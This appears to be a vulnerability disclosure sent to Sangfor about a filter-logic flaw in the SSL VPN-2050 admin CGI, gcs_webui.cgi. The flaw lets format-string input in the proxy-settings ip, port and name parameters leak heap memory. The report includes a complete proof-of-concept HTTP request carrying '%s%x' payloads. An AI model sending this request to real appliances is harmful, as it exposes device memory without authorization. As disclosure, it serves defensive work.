Hi,

I am eack from Codesafe Team of Legendsec at Qi'anxin Group.

Recently, I found that the Sangfor SSL VPN-2050 has a Heap overflow vulnerability. An attacker can leak heap memory by formatting a string. The tested device firmware version is M7.6.3. The vulnerability details are as follows:

This vulnerability is due to a logic vulnerability in the filter function, resulting in overflow of the ip and port parameters.

The vulnerability exists in gcs_webui.cgi, which corresponds to the IP address and port options under "System Maintenance - Proxy Settings" on the administration page.

Vulnerability code: 
![1.PNG](http://security.sangfor.com.cn:8000/ueditor/php/upload/image/20190627/1561622195475389.png)
Guess the developer wants to filter the ip and port parameters by the str_filter function. In the first if judgment, the str_filter function needs to return 0 to continue the following processing of the port parameter. The implementation of the str_filter function is as follows:
![2.PNG](http://security.sangfor.com.cn:8000/ueditor/php/upload/image/20190627/1561622267799970.png)
In this while loop, v2 does not play any role, the range of filtering characters is also problematic, resulting in as long as the number and '/' will fall into the while loop, always write data to a1, but if it is other characters For example, if the letter, '%', etc., it will return 0, but this just meets the judgment of if, and can continue the processing. This logic, just enough to constantly cover the address on the heap, leaks the data on the heap through formatted strings such as %s and %x.

The payload of the vulnerability recurrence is as follows:
On the 4430 port, the heap memory address is leaked through the ip parameter, port parameter, and name parameter:

GET /cgi-bin/gcs_webui.cgi?requestarg=2&requestname=17&csrf=f6a360046920f0382bf361f4688eabb4&enabled=1&ip=10.10.10.100000000000000000000000000%s%x&port=1111111%s%x&auth=1&name=aaaaaaa%s%x&passwd=111 HTTP/1.1
Host: 10.92.2.17:4430
Connection: close
Accept: /
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
Referer: https://10.92.2.17:4430/html/gcs_proxyset.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: language=zh_CN; TWFID=1a000798af849707; g_LoginPage=login_psw; VisitTimes=0; haveLogin=0; VpnLine=http%3A%2F%2F10.92.2.17%2F; sinfor_session_id=WA16F9E951F925B56F78666EFBF6DB22; PHPSESSID=e116e0e2c17bed877d1f825a77e6babf; usermrgstate=%7B%22params%22%3A%7B%22grpid%22%3A%22-100%22%2C%22recflag%22%3A0%2C%22filter%22%3A0%7D%2C%22pageparams%22%3A%7B%22start%22%3A0%2C%22limit%22%3A25%7D%2C%22otherparams%22%3A%7B%22searchtype%22%3A0%2C%22recflag%22%3Afalse%7D%7D; hidecfg=%7B%22name%22%3Afalse%2C%22flag%22%3Afalse%2C%22note%22%3Afalse%2C%22expire%22%3Atrue%2C%22lastlogin_time%22%3Atrue%2C%22phone%22%3Atrue%2C%22allocateip%22%3Atrue%2C%22other%22%3Afalse%2C%22state%22%3Afalse%7D; x-anti-csrf-gcs=0FB447BC0046963D

You can see the heap leak clearly on the web management interface:

![1.PNG](http://security.sangfor.com.cn:8000/ueditor/php/upload/image/20190627/1561624566926470.png)

This vulnerability can be fixed by modifying the logic of the filter function.

Best wishes
